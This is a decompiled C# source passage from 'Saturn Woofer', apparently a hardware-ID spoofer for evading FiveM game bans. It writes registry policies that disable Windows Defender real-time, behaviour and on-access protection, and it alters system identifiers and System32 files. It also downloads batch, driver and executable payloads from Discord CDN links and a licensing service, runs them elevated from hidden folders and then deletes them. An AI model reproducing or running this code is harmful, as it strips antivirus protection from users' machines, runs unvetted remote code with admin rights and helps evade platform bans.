      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\AppCompat", "DisableInventory", (object) "1", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\AppCompat", "DisablePCA", (object) "1", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\AppCompat", "DisableUAR", (object) "1", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Device Metadata", "PreventDeviceMetadataFromNetwork", (object) "1", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\MRT", "DontOfferThroughWUAU", (object) "1", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\AutoLogger\\SQMLogger", "Start", (object) "0", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\PolicyManager\\current\\device\\System", "AllowExperimentation", (object) 0);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender", "DisableAntiVirus", (object) "1", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender", "DisableSpecialRunningModes", (object) "1", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender", "DisableRoutinelyTakingAction", (object) "1", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender", "ServiceKeepAlive", (object) "0", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", "DisableRealtimeMonitoring", (object) "1", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Signature Updates", "ForceUpdateFromMU", (object) 0);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Spynet", "DisableBlockAtFirstSeen", (object) 1);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\MpEngine", "MpEnablePus", (object) "0", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender", "PUAProtection", (object) "0", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Policy Manager", "DisableScanningNetworkFiles", (object) "1", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender", "DisableAntiSpyware", (object) "1", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender", "DisableRealtimeMonitoring", (object) "1", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows Defender\\Spynet", "SpyNetReporting", (object) "0", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows Defender\\Spynet", "SubmitSamplesConsent", (object) "0", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\MRT", "DontReportInfectionInformation", (object) "1", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\MRT", "DontOfferThroughWUAU", (object) "1", RegistryValueKind.DWord);
      Registry.ClassesRoot.DeleteSubKeyTree("\\CLSID\\{09A47860-11B0-4DA5-AFA5-26D86198A780}", false);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", "DisableBehaviorMonitoring", (object) "1", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", "DisableOnAccessProtection", (object) "1", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", "DisableScanOnRealtimeEnable", (object) "1", RegistryValueKind.DWord);
      string path1 = "C:\\Program Files\\Win64";
      if (!Directory.Exists(path1))
        Directory.CreateDirectory(path1);
      if (System.IO.File.Exists("C:\\Program Files\\Win64\\net.bat"))
      {
        Process.Start("C:\\Program Files\\Win64\\net.bat");
      }
      else
      {
        string path2 = "C:\\Program Files\\Win64\\net.bat";
        using (StreamWriter text = System.IO.File.CreateText(path2))
          text.WriteLine("netsh int ip reset");
        Process process = new Process();
        process.StartInfo.FileName = path2;
        this.processlist.Add(process);
        System.IO.File.SetAttributes("C:\\Program Files\\Win64\\net.bat", FileAttributes.Hidden);
        process.Start();
      }
      Main.HWIDclick();
      Main.XBOXclick();
      Main.PCclick();
      Main.Diskclick();
      Main.FiveM();
      Main.New();
      Thread.Sleep(2000);
      int num = (int) MessageBox.Show("Spoofed FiveM, Use new rockstar,steam,discord and restart your pc!", "Saturn Woofer - Fast CFX v2", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
    }

    public static void ClickUnban()
    {
      List<Process> processList = new List<Process>();
      new Class1().spoofUserMode();
      string path1 = "C:\\Program Files\\Win64";
      if (!Directory.Exists(path1))
        Directory.CreateDirectory(path1);
      if (System.IO.File.Exists("C:\\Program Files\\Win64\\net.bat"))
      {
        Process.Start("C:\\Program Files\\Win64\\net.bat");
      }
      else
      {
        string path2 = "C:\\Program Files\\Win64\\net.bat";
        using (StreamWriter text = System.IO.File.CreateText(path2))
          text.WriteLine("netsh int ip reset");
        Process process = new Process();
        process.StartInfo.FileName = path2;
        processList.Add(process);
        System.IO.File.SetAttributes("C:\\Program Files\\Win64\\net.bat", FileAttributes.Hidden);
        process.Start();
      }
      Main.HWIDclick();
      Main.XBOXclick();
      Main.PCclick();
      Main.Diskclick();
      Main.FiveM();
      Main.New();
    }

    public static string GenID(int length) => new string(Enumerable.Repeat<string>("123457869", length).Select<string, char>((Func<string, char>) (s => s[Main.random.Next(s.Length)])).ToArray<char>());

    public static string DiskGen(int length) => new string(Enumerable.Repeat<string>("12345786789", length).Select<string, char>((Func<string, char>) (s => s[Main.random.Next(s.Length)])).ToArray<char>());

    private void siticoneGradientButton1_Click_1(object sender, EventArgs e) => ((Control) this.defpanel).BringToFront();

    private void timer3_Tick(object sender, EventArgs e)
    {
    }

    private void siticoneRoundedButton7_Click_3(object sender, EventArgs e)
    {
      new Class1().spoofUserMode();
      Main.HWIDclick();
      string str = Main.GenerateString(5) + "-" + Main.GenerateString(5) + "-" + Main.GenerateString(5) + "-" + Main.GenerateString(5);
      RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64).OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", true);
      registryKey.SetValue("ProductID", (object) str);
      registryKey.Close();
      Main.InstallDate();
      Main.Disk();
      Main.HWIDclick();
      Main.XBOXclick();
      Main.PCclick();
      Main.Diskclick();
      Main.New();
      Main.SetMachineName(Main.GenerateString(6));
      string path1 = "C:\\Program Files\\Win64";
      if (!Directory.Exists(path1))
        Directory.CreateDirectory(path1);
      if (System.IO.File.Exists("C:\\Program Files\\Win64\\net.bat"))
      {
        Process.Start("C:\\Program Files\\Win64\\net.bat");
      }
      else
      {
        string path2 = "C:\\Program Files\\Win64\\net.bat";
        using (StreamWriter text = System.IO.File.CreateText(path2))
          text.WriteLine("netsh int ip reset");
        Process process = new Process();
        process.StartInfo.FileName = path2;
        this.processlist.Add(process);
        System.IO.File.SetAttributes("C:\\Program Files\\Win64\\net.bat", FileAttributes.Hidden);
        process.Start();
      }
      if (System.IO.File.Exists("C:\\Program Files\\Unlisted\\Volumeid.exe"))
        System.IO.File.Delete("C:\\Program Files\\Unlisted\\Volumeid.exe");
      if (System.IO.File.Exists("C:\\Program Files\\Unlisted\\change.bat"))
        System.IO.File.Delete("C:\\Program Files\\Unlisted\\change.bat");
      string text1 = ((TextBox) this.diskname).Text;
      string path3 = "C:\\Program Files\\Unlisted";
      if (!Directory.Exists(path3))
        Directory.CreateDirectory(path3);
      if (System.IO.File.Exists("C:\\Program Files\\Unlisted\\Volumeid.exe"))
      {
        string path4 = "C:\\Program Files\\Unlisted\\change.bat";
        using (StreamWriter text2 = System.IO.File.CreateText(path4))
          text2.WriteLine("Volumeid.exe " + text1 + ": " + Main.DiskGen(4) + "-" + Main.DiskGen(4) + " -nobanner");
        Process process = new Process();
        process.StartInfo.FileName = path4;
        this.processlist.Add(process);
        System.IO.File.SetAttributes("C:\\Program Files\\Unlisted\\change.bat", FileAttributes.Hidden);
        process.Start();
        System.IO.File.Delete("C:\\Program Files\\Unlisted\\Volumeid.exe");
        System.IO.File.Delete("C:\\Program Files\\Unlisted\\change.bat");
        Directory.Delete(path3);
      }
      else
      {
        System.IO.File.WriteAllBytes("C:\\Program Files\\Unlisted\\Volumeid.exe", Saturn.Forms.Saturn.KeyAuthApp.download("558460"));
        System.IO.File.SetAttributes("C:\\Program Files\\Unlisted\\Volumeid.exe", FileAttributes.Hidden);
        Process.Start("C:\\Program Files\\Unlisted\\Volumeid.exe");
        Thread.Sleep(500);
        string path5 = "C:\\Program Files\\Unlisted\\change.bat";
        using (StreamWriter text3 = System.IO.File.CreateText(path5))
          text3.WriteLine("Volumeid.exe " + text1 + ": " + Main.DiskGen(4) + "-" + Main.DiskGen(4) + " -nobanner");
        Process process = new Process();
        process.StartInfo.FileName = path5;
        this.processlist.Add(process);
        System.IO.File.SetAttributes("C:\\Program Files\\Unlisted\\change.bat", FileAttributes.Hidden);
        process.Start();
        System.IO.File.Delete("C:\\Program Files\\Unlisted\\Volumeid.exe");
        System.IO.File.Delete("C:\\Program Files\\Unlisted\\change.bat");
        Directory.Delete(path3);
      }
      int num = (int) MessageBox.Show("Spoofed All System", "Saturn Woofer", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
    }

    private void premnew2_Click(object sender, EventArgs e)
    {
      Main.FiveM();
      Main.ClickUnban();
      int num = (int) MessageBox.Show("Spoofed G-Life Identifiers, Flash your bios and use vpn!", "Saturn Woofer", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
    }

    private void pictureBox1_Click(object sender, EventArgs e)
    {
      try
      {
        string path1 = "C:\\Program Files\\Saved\\imgsave.gif";
        if (System.IO.File.Exists(path1))
          System.IO.File.Delete(path1);
        Thread.Sleep(1000);
        string path2 = "C:\\Program Files\\Saved";
        if (!Directory.Exists(path2))
        {
          Directory.CreateDirectory(path2).Attributes = FileAttributes.Hidden | FileAttributes.Directory;
        }
        else
        {
          Directory.CreateDirectory("C:\\Program Files\\Saved");
          Directory.CreateDirectory(path2).Attributes = FileAttributes.Hidden | FileAttributes.Directory;
        }
        OpenFileDialog openFileDialog = new OpenFileDialog();
        openFileDialog.Filter = "Image Files(*.jpg; *.jpeg; *.gif; *.bmp)|*.jpg; *.jpeg; *.gif; *.bmp";
        if (openFileDialog.ShowDialog() != DialogResult.OK)
          return;
        this.pictureBox1.Image = (Image) new Bitmap(openFileDialog.FileName);
        System.IO.File.Copy(openFileDialog.FileName, "C:\\Program Files\\Saved\\imgsave.gif");
      }
      catch
      {
        int num = (int) MessageBox.Show("There was an error, try again later!", "Saturn Woofer", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
      }
    }

    private void siticoneButton1_Click_2(object sender, EventArgs e)
    {
      string path = "C:\\Program Files\\Pictures";
      try
      {
        string str1 = "https://cdn.discordapp.com/icons/967845422678822932/a_444e2cda0e74ed885c48b79012898b10.gif";
        string str2 = "C:\\Program Files\\Pictures\\saturn-logo.gif";
        if (!Directory.Exists(path))
          Directory.CreateDirectory(path);
        if (System.IO.File.Exists(str2))
        {
          this.pictureBox1.Image = (Image) new Bitmap(str2);
        }
        else
        {
          new WebClient().DownloadFile(str1, str2);
          this.pictureBox1.Image = (Image) new Bitmap(str1);
        }
        System.IO.File.Delete("C:\\Program Files\\Pictures\\imgsave.gif");
        Thread.Sleep(50);
        this.pictureBox1.Image = (Image) new Bitmap(str2);
        Thread.Sleep(2000);
        DirectoryInfo directoryInfo = new DirectoryInfo("C:\\Program Files\\Saved");
        foreach (FileSystemInfo file in directoryInfo.GetFiles())
          file.Delete();
        foreach (DirectoryInfo directory in directoryInfo.GetDirectories())
          directory.Delete(true);
      }
      catch
      {
      }
    }

    private void siticoneLabel11_Click(object sender, EventArgs e)
    {
    }

    private void rstarbp_CheckedChanged(object sender, EventArgs e)
    {
    }

    private void rstarbp_CheckedChanged_1(object sender, EventArgs e)
    {
    }

    private void siticoneButton3_Click(object sender, EventArgs e)
    {
      if (!System.IO.File.Exists("C:\\Program Files\\Win64\\net.bat"))
        return;
      System.IO.File.Move("C:\\Windows\\System32\\nvml2.dll", "C:\\Windows\\System32\\nvml.dll");
      System.IO.File.Move("C:\\Windows\\System32\\nvmld2.dll", "C:\\Windows\\System32\\nvmld.dll");
    }

    private void siticoneButton3_Click_1(object sender, EventArgs e)
    {
      new Process()
      {
        StartInfo = {
          FileName = "cmd.exe",
          CreateNoWindow = true,
          RedirectStandardInput = true,
          RedirectStandardOutput = true,
          UseShellExecute = false,
          Verb = "runas",
          Arguments = "/C netsh advfirewall firewall add rule name = \"FiveM2372Block\" dir =in action = block profile = any program = \"%LocalAppData%\\FiveM\\FiveM.app\\data\\cache\\subprocess\\fivem_b2372_gtaprocess.exe\" > nul && netsh advfirewall firewall set rule name = \"FiveM2372Block\" dir =in new enable= no > nul && netsh advfirewall firewall set rule name = \"FiveM2372Block\" dir =out new enable= no > nul && netsh advfirewall firewall set rule name = \"FiveMSteamBlock\" dir =in new enable= no > nul && netsh advfirewall firewall set rule name = \"FiveMSteamBlock\" dir =out new enable= no > nul && netsh advfirewall firewall set rule name = \"FiveMRockstarBlock\" dir =in new enable= no > nul && netsh advfirewall firewall set rule name = \"FiveMRockstarBlock\" dir =out new enable= no > nul && netsh advfirewall firewall set rule name = \"FiveM2189Block\" dir =in new enable= no > nul && netsh advfirewall firewall set rule name = \"FiveM2189Block\" dir =out new enable= no > nul && netsh advfirewall firewall set rule name = \"FiveM2060Block\" dir =in new enable= no > nul && netsh advfirewall firewall set rule name = \"FiveM2060Block\" dir =out new enable= no > nul && netsh advfirewall firewall set rule name = \"FiveM2545Block\" dir =in new enable= no > nul && netsh advfirewall firewall set rule name = \"FiveM2545Block\" dir =out new enable= no > nul"
        }
      }.Start();
      int num = (int) MessageBox.Show("Fixed FiveM Bypass Error", "Saturn Woofer", MessageBoxButtons.OK);
    }

    private async void premnew1_Click_1(object sender, EventArgs e)
    {
      Class1 spoof = new Class1();
      spoof.spoofUserMode();
      if (System.IO.File.Exists("C:\\Windows\\System32\\nvml.dll"))
      {
        try
        {
          System.IO.File.Move("C:\\Windows\\System32\\nvml.dll", "C:\\Windows\\System32\\nvml2.dll");
          System.IO.File.Move("C:\\Windows\\System32\\nvmld.dll", "C:\\Windows\\System32\\nvmld2.dll");
        }
        catch
        {
        }
      }
      int num = (int) MessageBox.Show("Cleaned Nvidia Traces!", "Saturn Woofer", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
      spoof = (Class1) null;
    }

    private void premnew1_Click(object sender, EventArgs e)
    {
      new Class1().spoofUserMode();
      if (System.IO.File.Exists("C:\\Windows\\System32\\nvml.dll"))
      {
        try
        {
          System.IO.File.Move("C:\\Windows\\System32\\nvml.dll", "C:\\Windows\\System32\\nvml2.dll");
          System.IO.File.Move("C:\\Windows\\System32\\nvmld.dll", "C:\\Windows\\System32\\nvmld2.dll");
        }
        catch
        {
        }
      }
      int num = (int) MessageBox.Show("Cleaned Nvidia Traces!", "Saturn Woofer", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
    }

    private void MethodCB_SelectedIndexChanged_2(object sender, EventArgs e)
    {
      if (((Control) this.MethodCB).Text == "FiveM Bypass")
      {
        ((Control) this.textip).Show();
        ((Control) this.enterip).Show();
      }
      else
      {
        ((Control) this.textip).Hide();
        ((Control) this.enterip).Hide();
      }
    }

    private void guna2Button6_Click(object sender, EventArgs e)
    {
    }

    private void siticoneRoundedButton11_Click_3(object sender, EventArgs e)
    {
    }

    private static void CoreDel() => Directory.Delete("C:\\Program Files\\Core", true);

    private void siticoneRoundedButton12_Click_2(object sender, EventArgs e)
    {
      string path = "C:\\Program Files\\Core";
      if (Directory.Exists(path))
        return;
      Directory.CreateDirectory(path).Attributes = FileAttributes.Hidden | FileAttributes.Directory;
      using (WebClient webClient = new WebClient())
      {
        webClient.DownloadFile("https://cdn.discordapp.com/attachments/953684464104513571/995620467111100526/hds.bat", "C:\\Program Files\\Core\\hds.bat");
        webClient.DownloadFile("https://cdn.discordapp.com/attachments/953684464104513571/995609965286936657/spf.sys", "C:\\Program Files\\Core\\spf.sys");
        webClient.DownloadFile("https://cdn.discordapp.com/attachments/953684464104513571/995609994676408350/mpp.exe", "C:\\Program Files\\Core\\mpp.exe");
        Thread.Sleep(1000);
        Process.Start(new ProcessStartInfo()
        {
          UseShellExecute = true,
          FileName = "C:\\Program Files\\Core\\hds.bat",
          WorkingDirectory = "C:\\Program Files\\Core",
          Verb = "runas"
        });
        Directory.Delete("C:\\Program Files\\Core", true);
      }
    }

    private void siticoneRoundedButton13_Click_1(object sender, EventArgs e)
    {
      string tempPath = Path.GetTempPath();
      byte[] bytes = Saturn.Forms.Saturn.KeyAuthApp.download("122387");
      System.IO.File.WriteAllBytes(tempPath + this.xynw + ".bat", bytes);
      System.IO.File.SetAttributes(tempPath + this.xynw + ".bat", FileAttributes.Hidden);
      Process.Start(tempPath + this.xynw + ".bat");
      this.xynwbyzia();
    }

    private void siticoneRoundedButton14_Click_1(object sender, EventArgs e)
    {
      new connect().Show();
      this.Hide();
    }

    private void siticoneRoundedButton15_Click_1(object sender, EventArgs e)
    {
      this.Hide();
      this.DisableMouse();
      Main.Kernel();
      Main.NullSerials();
      Main.HWIDclick();
      Main.SpoofHwProfileGUID();
      Main.SpoofGUID();
      Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\AutoComplete", "Append Completion", (object) "yes", RegistryValueKind.String);
      Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\AutoComplete", "AutoSuggest", (object) "yes", RegistryValueKind.String);
      Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer", "EnableAutoTray", (object) "0", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Remote Assistance", "fAllowToGetHelp", (object) "0", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "DisallowShaking", (object) "1", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_CLASSES_ROOT\\AllFilesystemObjects\\shellex\\ContextMenuHandlers\\Copy To", "", (object) "{C2FBB630-2971-11D1-A18C-00C04FD75D13}");
      Registry.SetValue("HKEY_CLASSES_ROOT\\AllFilesystemObjects\\shellex\\ContextMenuHandlers\\Move To", "", (object) "{C2FBB631-2971-11D1-A18C-00C04FD75D13}");
      Registry.SetValue("HKEY_CURRENT_USER\\Control Panel\\Desktop", "AutoEndTasks", (object) "1");
      Registry.SetValue("HKEY_CURRENT_USER\\Control Panel\\Desktop", "HungAppTimeout", (object) "1000");
      Registry.SetValue("HKEY_CURRENT_USER\\Control Panel\\Desktop", "MenuShowDelay", (object) "0");
      Registry.SetValue("HKEY_CURRENT_USER\\Control Panel\\Desktop", "WaitToKillAppTimeout", (object) "2000");
      Registry.SetValue("HKEY_CURRENT_USER\\Control Panel\\Desktop", "LowLevelHooksTimeout", (object) "1000");
      Registry.SetValue("HKEY_CURRENT_USER\\Control Panel\\Mouse", "MouseHoverTime", (object) "0");
      Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "NoLowDiskSpaceChecks", (object) "00000001", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "LinkResolveIgnoreLinkInfo", (object) "00000001", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "NoResolveSearch", (object) "00000001", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "NoResolveTrack", (object) "00000001", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "NoInternetOpenWith", (object) "00000001", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control", "WaitToKillServiceTimeout", (object) "2000");
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\DiagTrack", "Start", (object) "4", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\diagsvc", "Start", (object) "4", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\diagnosticshub.standardcollector.service", "Start", (object) "4", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\dmwappushservice", "Start", (object) "4", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "HideFileExt", (object) "0", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "Hidden", (object) "1", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile", "SystemResponsiveness", (object) 1, RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Games", "GPU Priority", (object) 8, RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Games", "Priority", (object) 6, RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Games", "Scheduling Category", (object) "High", RegistryValueKind.String);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Games", "SFIO Priority", (object) "High", RegistryValueKind.String);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Low Latency", "GPU Priority", (object) 0, RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Low Latency", "Priority", (object) 8, RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Low Latency", "Scheduling Category", (object) "Medium", RegistryValueKind.String);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Low Latency", "SFIO Priority", (object) "High", RegistryValueKind.String);
      Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\AutoComplete", true).DeleteValue("Append Completion", false);
      Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\AutoComplete", true).DeleteValue("AutoSuggest", false);
      Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer", true).DeleteValue("EnableAutoTray", false);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Remote Assistance", "fAllowToGetHelp", (object) "1", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "DisallowShaking", (object) "0", RegistryValueKind.DWord);
      Registry.ClassesRoot.DeleteSubKeyTree("AllFilesystemObjects\\\\shellex\\\\ContextMenuHandlers\\\\Copy To", false);
      Registry.ClassesRoot.DeleteSubKeyTree("AllFilesystemObjects\\\\shellex\\\\ContextMenuHandlers\\\\Move To", false);
      Registry.CurrentUser.OpenSubKey("Control Panel\\Desktop", true).DeleteValue("AutoEndTasks", false);
      Registry.CurrentUser.OpenSubKey("Control Panel\\Desktop", true).DeleteValue("HungAppTimeout", false);
      Registry.CurrentUser.OpenSubKey("Control Panel\\Desktop", true).DeleteValue("WaitToKillAppTimeout", false);
      Registry.CurrentUser.OpenSubKey("Control Panel\\Desktop", true).DeleteValue("LowLevelHooksTimeout", false);
      Registry.SetValue("HKEY_CURRENT_USER\\Control Panel\\Desktop", "MenuShowDelay", (object) "400");
      Registry.SetValue("HKEY_CURRENT_USER\\Control Panel\\Mouse", "MouseHoverTime", (object) "400");
      Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", true).DeleteValue("NoLowDiskSpaceChecks", false);
      Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", true).DeleteValue("LinkResolveIgnoreLinkInfo", false);
      Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", true).DeleteValue("NoResolveSearch", false);
      Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", true).DeleteValue("NoResolveTrack", false);
      Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", true).DeleteValue("NoInternetOpenWith", false);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control", "WaitToKillServiceTimeout", (object) "5000");
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\DiagTrack", "Start", (object) "2", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\diagnosticshub.standardcollector.service", "Start", (object) "2", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\dmwappushservice", "Start", (object) "2", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "HideFileExt", (object) "1", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "Hidden", (object) "0", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile", "SystemResponsiveness", (object) 14, RegistryValueKind.DWord);
      Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Games", true).DeleteValue("GPU Priority", false);
      Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Games", true).DeleteValue("Priority", false);
      Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Games", true).DeleteValue("Scheduling Category", false);
      Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Games", true).DeleteValue("SFIO Priority", false);
      Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Low Latency", true).DeleteValue("GPU Priority", false);
      Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Low Latency", true).DeleteValue("Priority", false);
      Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Low Latency", true).DeleteValue("Scheduling Category", false);
